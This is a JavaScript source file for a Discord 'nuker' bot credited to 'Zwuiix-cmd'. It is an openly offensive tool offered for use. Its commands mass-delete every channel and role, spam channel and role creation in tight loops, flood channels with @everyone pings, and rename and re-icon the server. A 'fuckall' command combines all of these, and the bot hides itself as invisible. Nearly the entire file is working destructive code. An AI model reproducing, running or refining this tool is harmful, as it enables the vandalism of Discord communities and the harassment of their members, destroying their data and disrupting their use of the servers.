const terminalTitle = require('node-bash-title');
const fs = require('fs');
const fetch = require('fetch');
const ps = require('prompt-sync');
const prompt = ps();
const colors = require('colors');
const gradient = require('gradient-string');

const {Client, Collection, Intents, MessageEmbed, MessageActionRow, MessageButton} = require('discord.js');
const config = require('./config.json');
const Discord = require('discord.js');
const client = new Discord.Client({intents:[Discord.GatewayIntentBits.MessageContent, Discord.GatewayIntentBits.Guilds, Discord.GatewayIntentBits.GuildMembers, Discord.GatewayIntentBits.GuildMessages]})
const {ButtonStyle} = require("discord-api-types/v9");
const {SlashCommandBuilder} = require("@discordjs/builders");
const {readFileSync} = require("fs");
client.discord = Discord;
client.config = config;

client.on("ready", () => {
  client.guilds.cache.forEach(guild => {
    if(guild == undefined || guild == null){
      console.clear();
      console.log(gradient('#6464FF', '#26C5FF')('0 servers found') + config.prefix);
      return;
    }
  })
  console.clear();
  terminalTitle("Discord Nuker - By Zwuiix-cmd#0001")
  console.log(gradient('#6464FF', '#26C5FF')('██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ \n██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗\n██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝\n██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗\n██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║\n╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝'));
  console.log(gradient('#6464FF', '#26C5FF')('\nConnected => ') + client.user.tag);
  console.log(gradient('#6464FF', '#26C5FF')('Server(s) => ') + client.guilds.cache.size);
  console.log(gradient('#6464FF', '#26C5FF')('Prefix => ') + config.prefix);
  console.log('Use '.gray+config.prefix+'help for help'.gray);

  client.user.setUsername(config.name);
  client.user.setAvatar(config.avatar)
  client.user.setStatus("invisible");
  client.user.setActivity("Zwuiix's Tools", {type: "LISTENING"});
  start();
})

function start()
{
  client.on("messageCreate", (message) => {

    let totalmembers = message.guild.memberCount;
    let commandes = message.content.trim().split(" ")[0].slice(1);
    let commande = message.content.replace(config.prefix, "")
    let args = message.content.trim().split(" ").slice(1);
    let prefix = config.prefix;

    if(commande === "help"){
      message.delete();
      const Embed = new MessageEmbed()
          .setDescription(`Welcome to the Discord Nuker help menu, there are several commands available below!`)
          .addFields({name: 'Channel Create Spam', value: `\`Done ${prefix}ccs\``},
              {name: 'Mass Ping Channel', value: `\`Done ${prefix}mpc\``},
              {name: 'Rename All Channel', value: `\`Done ${prefix}rac\``},
              {name: "Mass Roles", value: `\`Done ${prefix}mr\``},
              {name: "Mass Channel Delete", value: `\`Done ${prefix}mcd\``},
              {name: "Mass Roles Delete", value: `\`Done ${prefix}mrd\``},
              {name: "Clean", value: `\`Done ${prefix}clean\``})
          .setColor('6d6ee8')
      try{message.author.send({embeds: [Embed]});console.log(gradient('#6464FF', '#26C5FF')('Message sent to => ' + `${message.author.username}`));}catch (Error){}
    }
    if(commande === "ccs"){
      // Channel Create Spam
      message.delete();
      setInterval(function () {
        console.log(gradient('#6464FF', '#26C5FF')('Channel Created on ' + `${message.guild.name}`));
        message.guild.channels.create(`Zwuiix-tools`);
      }, 1)
    }
    if(commande === "mpc"){
      // Mass Ping Channel
      message.delete();
      setInterval(function () {
        console.log(gradient('#6464FF', '#26C5FF')('Message sent on ' + `${message.channelId}`));
        message.channel.send(config.message + ' @everyone');
      }, 100)
    }
    if(commande === "rac"){
      // Rename All Channel
      message.delete();
      console.log(gradient('#6464FF', '#26C5FF')('Message send on ' + `${message.guild.name}`));
      message.guild.channels.cache.forEach(chan => {
        chan.guild.channels.cache.get(chan.id).setName('Zwuiix-tools')
      })
    }
    if(commande === "mr"){
      // MASS ROLES
      message.delete();
      for (let i = 0; i <= 250; i++) {
        if (message.guild.roles.cache.size === 250) break;
        try{
          message.guild.roles.create({ name: "Nuked By Zwuiix Tools", color: "RANDOM", position: i++ });
        }catch (e){break;}
      }
    }
    if(commande === "mcd"){
      // MASS ROLES
      message.delete();
      message.guild.channels.cache.forEach(chan => {chan.guild.channels.cache.get(chan.id).delete();})
    }
    if(commande === "mrd"){
      // MASS ROLES
      message.delete();
      message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log("Error Found: " + err) }))
    }
    if(commande === "clean"){
      // CLEAN
      message.delete();
      message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log("Error Found: " + err) }))
      message.guild.channels.cache.forEach(chan => {chan.guild.channels.cache.get(chan.id).delete();})

      message.guild.setName("Clean with Zwuiix's Tools");
      message.guild.setIcon("");

      console.log(gradient('#6464FF', '#26C5FF')('Channel Created on ' + `${message.guild.name}`));
      message.guild.channels.create(`Zwuiix-tools`)


      const cleanest = new MessageEmbed()
          .setURL("https://youtube.com/Zwuiix")
          .setAuthor("Zwuiix-cmd#0001", "", "https://github.com/Zwuiix-cmd")
          .setDescription(`The server discord has been well cleaned with Zwuiix's Tools!`)
          .setFooter("Thanks for using Zwuiix's Tools")
          .setColor('6d6ee8')
      message.guild.channels.create(`Zwuiix-tools`, { type: "GUILD_TEXT" }).catch((err) => {console.log("Error Found: " + err)}).then((chan) => chan.send({embeds: [cleanest]}));
    }
    if(commande === "fuckall"){
      // FUCK ALL
      message.delete();

      message.guild.setName("Fucked with Zwuiix Tools");
      message.guild.setIcon("https://img1.pnghut.com/11/22/19/EpuJRRDeX4/tree-cartoon-flower-frame-heart.jpg");

      // DELETE ALL CHANNEL
      message.guild.channels.cache.forEach(chan => {chan.guild.channels.cache.get(chan.id).delete();})

      // DELETE ALL ROLES
      message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { console.log("Error Found: " + err) }))

      // ADD MASS ROLES
      for (let i = 0; i <= 250; i++) {if (message.guild.roles.cache.size === 250) break;try{message.guild.roles.create({ name: "Nuked By Zwuiix Tools", color: "RANDOM", position: i++ });}catch (e){break;}}

      // MASS PING
      for (let i = 0; i < 500; i++) {if (message.guild.channels.cache.size === 500) break;try{message.guild.channels.create(`Zwuiix-tools`, { type: "GUILD_TEXT" }).catch((err) => { console.log("Error Found: " + err) }).then((ch) => {setInterval(() => {ch.send(config.message + " @everyone @here");}, 1);});}catch (e){}
      }
    }
  })
}

client.login(config.token);